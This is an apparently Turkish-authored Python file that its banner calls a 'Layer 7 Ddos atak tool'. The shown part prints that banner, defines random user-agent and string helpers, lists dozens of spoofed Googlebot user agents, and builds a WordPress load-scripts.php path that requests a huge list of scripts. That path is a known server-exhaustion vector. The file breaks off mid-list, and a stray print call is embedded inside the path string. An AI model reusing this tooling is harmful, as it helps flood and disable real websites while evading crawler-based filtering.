# -*- coding: utf-8 -*-
import os
import socket
import random
import errno
import socks
import threading
os.system('color a' if os.name == 'nt' else 'echo -e \"\\033[32m\\\"')
os.system('cls' if os.name == 'nt' else 'clear')
print ("""
############################
# Coder: Cüneyt TANRISEVER #
# Layer 7 Ddos atak tool   #
############################
""")
def agentt():
    secmecekarpuz=random.choice(useragents)
    return secmecekarpuz
def googleagent():
    secmecekarpuz=random.choice(googleuseragents)
    return secmecekarpuz
def dex():
    dexalfabem=["a","b","c","d","f","e","g","h","i","j","k","l","m","n","o","u","p","r","s","t","v","y","z"]
    cuneyt= random.randint(1000, 9999)
    cuneyt1= random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)
    cuneyt2= random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)
    cuneytdex=cuneyt1+str(cuneyt)+cuneyt2
    return cuneytdex
dexdex = """/wp-admin/load-scripts.php?c=1&load[]=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,print("atak  başladı")word-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets"""
butunkabul = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
baglantisi = "Connection: Keep-Alive\r\n" 
googleuseragents=["Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/41.0.2272.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM2.171019.029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MTC19V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM6.171019.030.K1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM6.171019.030.B1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5x build/mtc19t AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2702.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MTC19T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5X Build/OPR6.170623.023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/N4F26I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/NBD90W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.68 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/NRD90R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/NBD90W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/NBD90W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM4.171019.016.A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5X Build/OPR4.170623.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MTC19Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181005.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/N4F26O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MHC19J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM2.171019.029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM6.171019.030.K1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/N4F26T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/N4F26T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5X Build/OPR4.170623.009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G48C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5X Build/OPR4.170623.009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MHC19J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/N5D91L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MHC19Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/NPG47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",]

useragents=["Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/41.0.2272.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM2.171019.029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MTC19V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM6.171019.030.K1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM6.171019.030.B1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5x build/mtc19t AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2702.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MTC19T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5X Build/OPR6.170623.023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/N4F26I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/NBD90W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.68 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/NRD90R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/NBD90W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/NBD90W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM4.171019.016.A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5X Build/OPR4.170623.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MTC19Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181005.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/N4F26O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MHC19J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM2.171019.029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM6.171019.030.K1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/N4F26T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X Build/N4F26T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5X Build/OPR4.170623.009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G48C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5X Build/OPR4.170623.009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MHC19J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/N5D91L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MHC19Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/NPG47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
